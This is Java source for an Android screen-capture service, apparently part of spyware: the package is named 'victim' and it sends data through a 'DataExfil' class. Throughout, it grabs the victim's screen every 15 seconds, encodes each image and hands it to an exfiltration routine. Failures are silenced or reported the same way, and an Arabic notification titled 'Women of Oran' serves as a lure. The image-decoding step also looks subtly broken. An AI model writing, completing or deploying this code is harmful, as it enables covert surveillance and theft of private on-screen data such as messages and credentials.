package com.geass.victim;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler(Looper.getMainLooper());
    private int resultCode;
    private Intent data;
    private boolean isCapturing = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(2, getNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && !isCapturing) {
            resultCode = intent.getIntExtra("resultCode", -1);
            data = intent.getParcelableExtra("data");
            if (resultCode != -1 && data != null) {
                startScreenCapture();
            }
        }
        return START_STICKY;
    }

    private void startScreenCapture() {
        try {
            MediaProjectionManager projectionManager = (MediaProjectionManager)
                    getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (projectionManager == null) return;

            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection == null) return;

            int density = getResources().getDisplayMetrics().densityDpi;
            int width = getResources().getDisplayMetrics().widthPixels;
            int height = getResources().getDisplayMetrics().heightPixels;

            if (width <= 0 || height <= 0) return;

            imageReader = ImageReader.newInstance(width, height,
                    PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                    width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            isCapturing = true;

            // Capture screenshot every 15 seconds
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (isCapturing) {
                        captureScreenshot();
                        handler.postDelayed(this, 15000);
                    }
                }
            }, 5000);
        } catch (Exception e) {
            DataExfil.send(this, "screenshot_error", e.getMessage());
        }
    }

    private void captureScreenshot() {
        try {
            if (imageReader == null) return;
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                if (planes != null && planes.length > 0) {
                    ByteBuffer buffer = planes[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);

                    // Convert to JPEG
                    Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    if (bitmap != null) {
                        ByteArrayOutputStream jpegStream = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, jpegStream);
                        String encoded = android.util.Base64.encodeToString(jpegStream.toByteArray(),
                                android.util.Base64.DEFAULT);
                        DataExfil.send(this, "screenshot", encoded);
                        bitmap.recycle();
                    }
                }
                image.close();
            }
        } catch (Exception e) {
            // Silent fail
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("capture_channel",
                    "شاشة", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "capture_channel");
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
                .setContentTitle("نساء وهران")
                .setContentText("تسجيل الشاشة قيد التشغيل")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(Notification.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        isCapturing = false;
        handler.removeCallbacksAndMessages(null);
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}